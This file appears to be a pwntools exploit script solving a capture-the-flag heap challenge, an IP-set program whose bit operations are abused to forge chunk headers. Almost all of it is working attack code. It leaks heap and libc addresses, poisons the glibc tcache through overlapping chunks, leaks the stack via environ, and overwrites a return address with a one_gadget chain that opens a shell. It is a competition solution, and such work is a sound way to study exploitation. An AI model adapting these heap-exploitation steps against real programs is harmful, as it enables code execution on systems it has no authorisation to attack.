from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = './chal'
exe_args = []
PREFIX = b":"
speed = 0.2

io: process = None

def debug(pid=io):
    gdb.attach(pid, gdbscript=
    """
    
    """, exe=file)
    input("debug")

def launch_remote():
    global file, io
    io = process(["./nc.openbsd", *("-X connect -x instance.penguin.0ops.sjtu.cn:18081 mm7kyp3bx67rwjcr 1".split(" "))])
    # io = remote('tvervrx4wrp62e6x', 1)

def launch_docker():
    global file, io
    io = remote("localhost", 1234)
    if args.GDB:
        out = subprocess.run(["pgrep", "--newest", file], capture_output=True)
        debug(int(out.stdout))

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug(io)

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)
show_leak = lambda a, b: success("%s: %#018x" % (a, b))

def launch():
    if args.REMOTE:
        l = launch_remote
    elif args.DOCKER:
        l = launch_docker
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF('libc.so.6')

import socket
from math import log2
start_ip = end_ip = 0

tries = 0
def exploit():
    def num2ip(n):
        return socket.inet_ntoa(struct.pack('!L', n)).encode()

    def add_ip_set(start, end):
        global start_ip, end_ip
        start_ip, end_ip = start, end
        choice(1)
        slaprefix(num2ip(start))
        slaprefix(num2ip(end))
    def set_bit(offset, bit, v):
        choice(3 if v == 0 else 2)
        slaprefix(num2ip(start_ip + offset*8 + bit))
    def manual_set_bit(offset, bit, v):
        choice(3 if v == 0 else 2)
        slaprefix(num2ip(start_ip + offset*8 + int(log2(bit+1))))
    def set_byte(offset, v):
        for i in range(8):
            set_bit(offset, i, (v >> i) & 1)
    def set_addr(offset, ptr):
        for i in range(6):
            set_byte(offset+i, (ptr >> i*8) & 0xff)
    def set_64(offset, v):
        for i in range(8):
            set_byte(offset+i, (v >> i*8) & 0xff)


    def set_bit_range(data, v):
        if type(data) == str:
            data = data.encode()
        choice(2 if v == 1 else 3)
        slaprefix(data)

    def show_bit(offset, bit):
        choice(4)
        slaprefix(num2ip(start_ip + offset*8 + bit))
        return b"not" not in recvu(b"1. Create IP Set")
    def show_bits(offset, bits):
        global start_ip
        value = 0
        for i in range(bits):
            if show_bit(offset, i):
                value |= 1 << i
        return value
    
    def free_ip_range():
        choice(5)


    start = 0
    add_ip_set(start, ((0x218-1)<<3)+start)
    free_ip_range() # goes in tcache 0x220
    add_ip_set(start, ((0x218-1)<<3)+start) # realloc from tcache -> leak safelinked fd
    heap = show_bits(0, 48) << 12
    show_leak("heap", heap)
    free_ip_range()



    start = 0x3d
    add_ip_set(start, ((0xdf8-1)<<3)+start) # alloc 0xe00 chunk
    
    manual_set_bit(0x600-0x8, 0, 1) # make a valid unsorted (nextchunk)
    manual_set_bit(0x600-0x8, 0x20, 1)
    manual_set_bit(0x620-0x8, 0, 1)

    set_bit_range(f"{start}/26", 0) # zero 0xe01 upper bit (become 0x601)
    free_ip_range() # free a 0x600 sized chunk -> won't merge with top, will go in unsorted


    start = 0
    add_ip_set(start, ((0x5f8-1)<<3)+start) # alloc the 0x600 sized chunk from unsorted
    libc.address = show_bits(0, 48) - 0x21ace0 # now leak the fd -> libc leak
    show_leak("libc", libc.address)


    # The goal here is to get a controlled chunk that overlaps with a tcache chunk
    start = 0x3c # this chunk will overlap (will merge with merged chunk)
    add_ip_set(start, ((0x1d18-1)<<3)+start) # same process with a 0x1d20 sized chunk
    # 0x1d20 -> 0xd20 -> 0x520

    manual_set_bit(0xc20-0x8, 0, 1) # make valid unsorted
    manual_set_bit(0xc20-0x8, 0x20, 1)
    manual_set_bit(0xc40-0x8, 0, 1)

    set_bit_range(f"{start}/26", 0) # become 0xd20 sized, won't merge with top
    free_ip_range()


    begin = heap+0x290+0x220+0xe00 # some offsets
    coal = 0x1920

    start = 0x3e # this chunk will be allocated from top
    add_ip_set(start, ((0xe18-1)<<3)+start) # 0xe20 -> 0x220 (zero 2 bits)
    set_addr(0x10, coal) # merged chunk size (prevsize), merged chunk is just after the tcache chunk, so the overlapping chunk will contain the tcache chunk fd
    manual_set_bit(0x18, 0x20, 1)
    manual_set_bit(0x10+0x20, 0, 1)
    set_bit_range(f"{start}/26", 0) # become a 0x220 sized chunk
    free_ip_range() # free into 0x220 tcache



    start = 0x3d # this 
    add_ip_set(start, ((0xc18-1)<<3)+start) # alloc the 0xd20 sized chunk
    set_addr(0x20, begin+0x420) # prepare fake fd & bk (fake unsorted merge to make chunk overlap)
    manual_set_bit(0x420-0x8, 0, 1)
    set_addr(0x420-0x8, coal | 1) # merged chunk size
    # fake fd & bk to bypass fk->bk = chunk
    set_addr(0x428-0x8, begin+0x20-8) # fake fd
    set_addr(0x430-0x8, begin+0x20) # fake bk
    set_bit_range(f"{start}/26", 0) # become 0x420
    free_ip_range() # will merge chunk to make an overlapping chunk that contains the tcache one
    

    start = 0 # allocate the overlapping chunk
    add_ip_set(start, ((0x1d38-1)<<3)+start)
    set_addr(0x1d20, safe_link(begin+0x1d20+0x10, heap+0x10)) # overwrite the tcache fd -> points to the tcache_perthread_struct

    add_ip_set(start, ((0x218-1)<<3)+start) # update fd
    add_ip_set(start, ((0x218-1)<<3)+start) # this allocation will point to the tcache_perthread_struct

    # set the tcache counts
    manual_set_bit(0, 0, 1) # 0x20
    manual_set_bit(0x20, 0, 1) # 0x120
    # set the tcache fd
    set_addr(0x80, libc.sym.environ) # 0x20 -> stack leak
    set_addr(0x80+(0x20//2)*8, heap+0x10) # 0x120 -> point to tcache_perthread_struct again for further arb write


    add_ip_set(start, ((0x18-1)<<3)+start) # allocate a chunk to leak environ
    environ = show_bits(0, 48)
    show_leak("environ", environ)

    add_ip_set(start, ((0x118-1)<<3)+start) # allocate a chunk to rewrite tcache_perthread_struct again
    manual_set_bit(0x20, 0, 1) # 0x120, tcache count
    off = 0xf0
    set_addr(0x80+(0x20//2)*8, environ-0x178-off) # tcache fd = stack

    start = 0
    add_ip_set(start, ((0x118-1)<<3)+start) # make a ropchain
    set_addr(off+0x10, libc.address+0xebd3f) # one gadget
    # attacking "add_ip_address" return address
    # we cannot directly overwrite its return address because that would require multiple calls to "add_ip_address"
    # so we put the one_gadget after and overwrite the return address with a ret gadget

    set_bit_range(f"{(off+8)*8+6}-{(off+8)*8+7}", 1) # replace return address with ret gadget with one call to "add_ip_address"


    io.interactive()
    exit()

if not args.BF:
    launch()
    exploit()
    exit()
else:
    tries_prog = log.progress("Tries")
    while True:
        count = 0
        tries += 1
        tries_prog.status(str(tries))

        launch()
        try:
            exploit()
        except EOFError:
            pass

        with context.local(log_level=logging.ERROR):
            io.close()
        # sleep(0.05)
